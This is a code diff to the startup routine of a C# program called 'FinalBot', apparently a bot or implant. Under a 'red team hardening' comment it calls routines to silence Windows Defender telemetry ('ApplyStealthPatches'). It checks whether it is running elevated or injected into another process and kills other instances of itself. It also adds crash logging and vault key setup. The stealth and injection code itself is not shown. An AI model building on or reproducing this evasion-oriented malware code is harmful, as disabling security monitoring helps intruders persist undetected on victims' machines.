@@ -26,12 +26,23 @@ namespace FinalBot
 
         private static void Log(string msg) => DebugLog(msg);
 
-        static async Task Main(string[] args)
+        public static async Task Main(string[] args)
         {
+            AppDomain.CurrentDomain.UnhandledException += (s, e) => {
+                DebugLog($"FATAL CRASH: {e.ExceptionObject}");
+            };
+            TaskScheduler.UnobservedTaskException += (s, e) => {
+                DebugLog($"UNOBSERVED TASK ERROR: {e.Exception}");
+                e.SetObserved();
+            };
+
+            // [V6.12] Initialize Crypto Keys first for reliable Vault access
+            SafetyManager.StartupKeys();
+
             // [RED TEAM HARDENING] Silence Defender Telemetry Immediately
             SafetyManager.ApplyStealthPatches();
 
-            Console.WriteLine($"[DEBUG] Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
+            DebugLog($"Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
             
             bool isInjected = ElevationService.IsInjected();
             int fromPid = 0;
@@ -46,15 +57,24 @@ namespace FinalBot
 
                 if (!createdNew) 
                 {
+                    DebugLog("Mutex conflict: killing previous instances...");
                     string currentName = Process.GetCurrentProcess().ProcessName;
                     int currentId = Process.GetCurrentProcess().Id;
                     foreach (var proc in Process.GetProcessesByName(currentName)) {
-                        if (proc.Id != currentId) try { proc.Kill(true); } catch { }
+                        if (proc.Id != currentId) {
+                            try { 
+                                proc.Kill(true); 
+                                proc.WaitForExit(3000); 
+                            } catch { }
+                        }
                     }
-                    Thread.Sleep(3000); 
+                    Thread.Sleep(1000); 
                     _mutex?.Dispose();
                     _mutex = new Mutex(true, mutexName, out createdNew);
-                    if (!createdNew) return;
+                    if (!createdNew) {
+                        DebugLog("Failed to acquire mutex after cleanup. Exiting.");
+                        return;
+                    }
                 }
                 DebugLog($"Mutex acquired: {mutexName}.");
             }
